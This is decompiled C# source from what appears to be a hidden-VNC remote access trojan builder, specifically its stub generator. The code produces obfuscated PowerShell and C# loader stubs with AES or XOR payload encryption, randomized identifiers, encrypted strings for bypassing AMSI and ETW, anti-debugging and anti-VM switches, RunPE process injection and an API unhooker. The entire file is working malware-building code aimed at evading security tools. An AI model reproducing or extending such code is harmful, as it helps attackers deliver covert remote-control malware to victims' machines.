using System;
using System.Text;

namespace BirdBrainmofo.HVNC.StubUtils
{
	// Token: 0x020000B0 RID: 176
	public class StubGen
	{
		// Token: 0x0600086C RID: 2156 RVA: 0x0005AFD4 File Offset: 0x000591D4
		public static string CreatePS(byte[] key, byte[] byte_0, EncryptionMode mode, Random rng)
		{
			string text = Utils.RandomString(5, rng);
			string text2 = Utils.RandomString(5, rng);
			string text3 = Utils.RandomString(5, rng);
			string text4 = Utils.RandomString(5, rng);
			string text5 = Utils.RandomString(5, rng);
			string text6 = Utils.RandomString(5, rng);
			string text7 = Utils.RandomString(5, rng);
			string text8 = Utils.RandomString(5, rng);
			string text9 = Utils.RandomString(5, rng);
			string text10 = Utils.RandomString(5, rng);
			string text11 = Utils.RandomString(5, rng);
			string text13;
			if (mode == EncryptionMode.AES)
			{
				string text12 = Utils.GetEmbeddedString("HVNC.Resources.AESStub.ps1");
				text12 = text12.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
				text12 = text12.Replace("DECRYPTION_IV", Convert.ToBase64String(byte_0));
				text12 = text12.Replace("tbsreversed_var", text);
				text12 = text12.Replace("tbs_var", text2);
				text12 = text12.Replace("contents_var", text3);
				text12 = text12.Replace("lastline_var", text4);
				text12 = text12.Replace("payload_var", text5);
				text12 = text12.Replace("aes_var", text7);
				text12 = text12.Replace("decryptor_var", text8);
				text12 = text12.Replace("msi_var", text9);
				text12 = text12.Replace("mso_var", text10);
				text12 = text12.Replace("gs_var", text11);
				text12 = text12.Replace(Environment.NewLine, string.Empty);
				text13 = text12;
			}
			else
			{
				string text14 = Utils.GetEmbeddedString("HVNC.Resources.XORStub.ps1");
				text14 = text14.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
				text14 = text14.Replace("tbsreversed_var", text);
				text14 = text14.Replace("tbs_var", text2);
				text14 = text14.Replace("contents_var", text3);
				text14 = text14.Replace("lastline_var", text4);
				text14 = text14.Replace("payload_var", text5);
				text14 = text14.Replace("key_var", text6);
				text14 = text14.Replace("msi_var", text9);
				text14 = text14.Replace("mso_var", text10);
				text14 = text14.Replace("gs_var", text11);
				text14 = text14.Replace(Environment.NewLine, string.Empty);
				text13 = text14;
			}
			return text13;
		}

		// Token: 0x0600086D RID: 2157 RVA: 0x0005B1FC File Offset: 0x000593FC
		public static string CreateCS(byte[] key, byte[] byte_0, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
		{
			string text = Utils.RandomString(20, rng);
			string text2 = Utils.RandomString(20, rng);
			string text3 = Utils.RandomString(20, rng);
			string text4 = Utils.RandomString(20, rng);
			string text5 = Utils.RandomString(20, rng);
			string text6 = Utils.RandomString(20, rng);
			string text7 = Utils.RandomString(20, rng);
			string text8 = Utils.RandomString(20, rng);
			string text9 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, byte_0));
			string text10 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("EtwEventWrite"), key, byte_0));
			string text11 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, byte_0));
			string text12 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, byte_0));
			string text13 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("payload.exe"), key, byte_0));
			string text14 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("runpe.dll"), key, byte_0));
			string text15 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("runpe.RunPE"), key, byte_0));
			string text16 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("ExecutePE"), key, byte_0));
			string text17 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.dll"), key, byte_0));
			string text18 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.APIUnhooker"), key, byte_0));
			string text19 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("Start"), key, byte_0));
			string text20 = Convert.ToBase64String(Utils.Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h \""), key, byte_0));
			string text21 = Convert.ToBase64String(key);
			string text22 = Convert.ToBase64String(byte_0);
			string text23 = string.Empty;
			string text24 = Utils.GetEmbeddedString("HVNC.Resources.Stub.cs");
			if (antidebug)
			{
				text23 += "#define ANTI_DEBUG\n";
			}
			if (antivm)
			{
				text23 += "#define ANTI_VM\n";
			}
			if (native)
			{
				text23 += "#define USE_RUNPE\n";
			}
			if (mode == EncryptionMode.XOR)
			{
				text23 += "#define XOR_ENCRYPT\n";
			}
			else
			{
				text23 += "#define AES_ENCRYPT\n";
			}
			text24 = text24.Replace("namespace_name", text);
			text24 = text24.Replace("class_name", text2);
			text24 = text24.Replace("aesfunction_name", text3);
			text24 = text24.Replace("uncompressfunction_name", text4);
			text24 = text24.Replace("getembeddedresourcefunction_name", text5);
			text24 = text24.Replace("virtualprotect_name", text6);
			text24 = text24.Replace("checkremotedebugger_name", text7);
			text24 = text24.Replace("isdebuggerpresent_name", text8);
			text24 = text24.Replace("amsiscanbuffer_str", text9);
			text24 = text24.Replace("etweventwrite_str", text10);
			text24 = text24.Replace("checkremotedebugger_str", text11);
			text24 = text24.Replace("isdebuggerpresent_str", text12);
			text24 = text24.Replace("payloadtxt_str", text13);
			text24 = text24.Replace("runpedlltxt_str", text14);
			text24 = text24.Replace("runpeclass_str", text15);
			text24 = text24.Replace("runpefunction_str", text16);
			text24 = text24.Replace("unhookertxt_str", text17);
			text24 = text24.Replace("unhookerclass_str", text18);
			text24 = text24.Replace("unhookerfunction_str", text19);
			text24 = text24.Replace("cmdcommand_str", text20);
			text24 = text24.Replace("key_str", text21);
			text24 = text24.Replace("iv_str", text22);
			return text23 + text24;
		}

		// Token: 0x0600086E RID: 2158 RVA: 0x00006F52 File Offset: 0x00005152
    }
}
